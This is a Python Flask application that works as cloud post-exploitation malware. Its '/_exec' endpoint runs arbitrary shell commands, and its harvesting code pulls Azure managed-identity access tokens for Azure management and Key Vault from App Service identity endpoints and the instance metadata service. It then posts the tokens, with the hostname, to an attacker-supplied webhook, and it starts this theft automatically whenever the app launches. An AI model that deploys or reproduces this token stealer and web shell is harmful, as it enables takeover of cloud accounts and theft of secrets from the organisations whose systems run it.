#!/usr/bin/env python3
import os, json, time, socket, shlex, subprocess
from urllib.parse import urlencode
from threading import Thread

import requests
from flask import Flask, Response, request, jsonify, abort

app = Flask(__name__)

# ===== Exec helper (unchanged semantics) =====
ENABLE_CMD = os.getenv("ENABLE_CMD", "0") == "1"
CMD_TOKEN  = os.getenv("CMD_TOKEN")
ALLOW_CSV  = os.getenv("CMD_ALLOW", "")  # e.g. "env,ls,cat,id,whoami"

def allowed(cmd: str) -> bool:
    if not ALLOW_CSV:
        return True
    head = shlex.split(cmd)[0] if cmd else ""
    return head in {c.strip() for c in ALLOW_CSV.split(",") if c.strip()}

@app.post("/_exec")
def _exec():
    if not ENABLE_CMD:
        abort(404)
    if not CMD_TOKEN or request.headers.get("X-Cmd-Token") != CMD_TOKEN:
        abort(401)
    payload = request.get_json(silent=True) or {}
    cmd = payload.get("cmd") or request.args.get("cmd")
    if not cmd:
        abort(400, "missing cmd")
    if not allowed(cmd):
        abort(403, "command not allowed")
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return jsonify(code=p.returncode, stdout=p.stdout, stderr=p.stderr)
    except subprocess.TimeoutExpired:
        return jsonify(error="timeout"), 504

# ===== MSI / IMDS harvesting =====
WEBHOOK  = os.environ.get("WEBHOOK_URL", "").strip()
UAMI_CID = os.environ.get("UAMI_CID", "").strip()    # optional

# App Service (new) env
IDENTITY_ENDPOINT = os.getenv("IDENTITY_ENDPOINT", "").strip()
IDENTITY_HEADER   = os.getenv("IDENTITY_HEADER", "").strip()
# App Service (legacy) env
MSI_ENDPOINT = os.getenv("MSI_ENDPOINT", "").strip()
MSI_SECRET   = os.getenv("MSI_SECRET", "").strip()

SESSION = requests.Session()
SESSION.timeout = 4  # keep it snappy

# Resource audiences to try
RESOURCES = [
    ("arm", "https://management.azure.com/"),
    ("kv",  "https://vault.azure.net/"),
]

# IMDS fallbacks (no envs)
IMDS_BASES = [
    ("2021-12-13", "http://169.254.169.254/metadata/identity/oauth2/token"),
    ("2018-02-01", "http://169.254.169.254/metadata/identity/oauth2/token"),
]

def try_appsvc_new(resource: str, client_id: str | None):
    """IDENTITY_ENDPOINT + X-IDENTITY-HEADER (2019-08-01)."""
    if not (IDENTITY_ENDPOINT and IDENTITY_HEADER):
        return None
    params = {"api-version": "2019-08-01", "resource": resource}
    if client_id:
        # either client_id in query or X-IDENTITY-CLIENTID header may work
        params["client_id"] = client_id
        headers = {"X-IDENTITY-HEADER": IDENTITY_HEADER, "Metadata": "true", "X-IDENTITY-CLIENTID": client_id}
    else:
        headers = {"X-IDENTITY-HEADER": IDENTITY_HEADER, "Metadata": "true"}
    try:
        r = SESSION.get(IDENTITY_ENDPOINT, params=params, headers=headers)
        j = r.json() if r.ok else {}
        return j.get("access_token")
    except Exception:
        return None

def try_appsvc_legacy(resource: str, client_id: str | None):
    """MSI_ENDPOINT + MSI_SECRET (2017-09-01)."""
    if not (MSI_ENDPOINT and MSI_SECRET):
        return None
    # Some environments are picky about trailing slash on resource; try both
    for res in (resource, resource.rstrip("/"), resource.rstrip("/") + "/"):
        params = {"api-version": "2017-09-01", "resource": res}
        if client_id:
            # legacy uses clientid (no underscore)
            params["clientid"] = client_id
        try:
            r = SESSION.get(MSI_ENDPOINT, params=params, headers={"secret": MSI_SECRET})
            j = r.json() if r.ok else {}
            tok = j.get("access_token")
            if tok:
                return tok
        except Exception:
            pass
    return None

def try_imds(resource: str, client_id: str | None):
    """Standard VM IMDS with Metadata:true."""
    headers = {"Metadata": "true"}
    for api, base in IMDS_BASES:
        params = {"api-version": api, "resource": resource}
        if client_id:
            params["client_id"] = client_id
        try:
            r = SESSION.get(base, params=params, headers=headers)
            j = r.json() if r.ok else {}
            tok = j.get("access_token")
            if tok:
                return tok
        except Exception:
            pass
    return None

def get_token(resource: str, client_id: str | None):
    # Prefer App Service “new”, then legacy, then IMDS
    for fn in (try_appsvc_new, try_appsvc_legacy, try_imds):
        tok = fn(resource, client_id)
        if tok:
            return tok
    return None

def exfil(data: dict):
    if not WEBHOOK:
        print("[*] No WEBHOOK_URL set; skipping exfil.")
        return
    try:
        payload = {
            "host": socket.gethostname(),
            "ts": int(time.time()),
            "data": json.dumps(data),
        }
        requests.post(WEBHOOK, data=payload, timeout=5)
        print("[+] Exfil sent.")
    except Exception as e:
        print(f"[!] Exfil failed: {e}")

def harvest():
    print("[*] Harvest thread started.")
    findings = {"tokens": {}, "env": {
        "IDENTITY_ENDPOINT": bool(IDENTITY_ENDPOINT),
        "MSI_ENDPOINT": bool(MSI_ENDPOINT),
        "HAS_UAMI": bool(UAMI_CID),
    }}

    # System-assigned first
    for name, res in RESOURCES:
        tok = get_token(res, None)
        if tok:
            findings["tokens"][f"system_{name}"] = tok

    # User-assigned if provided
    if UAMI_CID:
        for name, res in RESOURCES:
            tok = get_token(res, UAMI_CID)
            if tok:
                findings["tokens"][f"uami_{name}"] = tok

    exfil(findings)
    print("[*] Harvest thread done.")

@app.get("/_harvest")
def harvest_now():
    t = Thread(target=harvest, daemon=True)
    t.start()
    return jsonify(status="started")

@app.get("/_health")
def health():
    return jsonify(ok=True, has_identity_endpoint=bool(IDENTITY_ENDPOINT), has_msi_endpoint=bool(MSI_ENDPOINT))

@app.route("/")
def index():
    return Response("ok\n", mimetype="text/plain")

def start_bg():
    Thread(target=harvest, daemon=True).start()

if __name__ == "__main__":
    start_bg()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "80")))
else:
    start_bg()  # gunicorn import path
